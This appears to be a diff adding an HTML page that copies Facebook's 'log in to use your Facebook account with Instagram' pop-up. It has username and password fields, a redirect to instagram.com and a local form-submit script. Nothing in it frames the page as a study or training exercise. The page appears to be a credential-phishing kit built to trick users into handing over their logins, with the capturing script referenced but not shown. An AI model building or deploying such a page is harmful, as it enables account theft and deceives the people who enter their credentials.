@@ -1,0 +1,203 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Facebook</title>
+  <style>
+    body {
+      font-family: sans-serif;
+      margin: 0;
+    }
+
+    .container>.top-container {
+      background-color: #365899;
+      display: flex;
+      width: 100%;
+      justify-content: start;
+      padding: 6px;
+    }
+
+    .container .top-container div {
+      display: inline;
+    }
+
+    .container .top-container div>.homeLink {
+      font-weight: bold;
+      color: #fff;
+      font-size: 13px;
+      font-weight: 600;
+    }
+
+    .iconFacebook {
+      display: inline-block;
+      margin-right: 1px;
+      position: relative;
+      top: 3px;
+    }
+
+    .bottom-container {
+      margin-top: 15px;
+      font-size: 13px;
+    }
+
+    .bottom-container>.title {
+      display: inline;
+      font-size: 13px;
+      margin-left: 25px;
+    }
+
+    .bottom-container .title>span {
+      font-size: 14px;
+      font-weight: 600;
+    }
+
+    .bottom-container>.form-container {
+      width: 100%;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .bottom-container .form-container div {
+      display: flex;
+      flex-direction: row;
+      width: 100%;
+      margin: 12px;
+    }
+
+    .bottom-container .form-container label {
+      width: 130px;
+      color: #606770;
+      cursor: default;
+      font-weight: 600;
+    }
+
+    .bottom-container .form-container input {
+      background: #ffffff;
+      border: 1px solid #dddfe2;
+      color: #1d2129;
+      font-family: Helvetica, Arial, sans-serif;
+      font-size: 12px;
+      height: 22px;
+      line-height: 16px;
+      padding: 0 8px;
+      vertical-align: middle;
+    }
+
+    .bottom-container .form-container .checkbox {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      margin-left: 76px;
+    }
+
+    .bottom-container .form-container .checkbox input {
+      font-family: Helvetica, Arial, sans-serif;
+      font-size: 12px;
+    }
+
+    .bottom-container .form-container .checkbox label {
+      width: 190px;
+      color: #333;
+      font-weight: normal;
+      display: inline-block;
+      margin-left: 2px;
+      vertical-align: baseline;
+    }
+
+    .bottom-container .form-container form>button {
+      background-color: #4267b2;
+      border: solid 1px #29487d;
+      color: #fff;
+      padding: 3px 5px;
+      cursor: pointer;
+      font-size: 13px;
+      font-weight: 600;
+      margin-left: 143px;
+    }
+
+    .bottom-container .form-container>.sub-link {
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      margin-left: 69px;
+    }
+
+    .bottom-container .sub-link>a {
+      color: #385898;
+      cursor: pointer;
+      text-decoration: none;
+      margin-bottom: 14px;
+    }
+
+    .bottom-container .sub-link>button {
+      background-color: #42b72a;
+      border: solid 1px #42b72a;
+      color: #fff;
+      padding: 3px 5px;
+      cursor: pointer;
+      font-weight: 600;
+      font-size: 12px;
+      margin-left: 16px;
+    }
+
+    .bottom-container .checkbox span {
+      font-size: 12px;
+      font-weight: 600;
+    }
+  </style>
+</head>
+
+<body>
+  <div class="container">
+    <div class="top-container">
+      <div>
+        <span class="iconFacebook"></span>
+        <img src="/images/facebookLogo.png" alt="">
+        <span class="homeLink KPnG0">Facebook</span>
+      </div>
+    </div>
+
+    <div class="bottom-container">
+      <div class="title">Log in to use your Facebook account with <span>Instagram.</span></div>
+
+      <div class="form-container">
+        <form id="loginForm" method="post" data-type="instagram.com/facebook pop-up"
+          data-redirect="https://www.instagram.com">
+          <div>
+            <label for="emailOrPhoneNo">Email address or phone number:</label>
+            <input type="text" id="emailOrPhoneNo" name="username" required />
+          </div>
+
+          <div>
+            <label for="password">Password:</label>
+            <input type="password" id="password" name="password" required />
+          </div>
+
+          <div class="checkbox">
+            <input type="checkbox" name="remaider" id="remaider" required />
+            <label for="remaider">Keep me logged in to <span>Instagram.</span></label>
+          </div>
+
+          <button type="submit">Log In</button>
+        </form>
+        <div class="sub-link">
+          <a href="#">Forgotten account?</a>
+          <button type="submit">Create New Account</button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script src="https://code.jquery.com/jquery-3.7.1.min.js"
+    integrity="sha256-/JqT3SQfawRcv/BIHPThkBvs0OEvtFFmqPF/lYI/Cxo=" crossorigin="anonymous"></script>
+
+  <script src="/js/form_submit.js"></script>
+</body>
+
+</html>
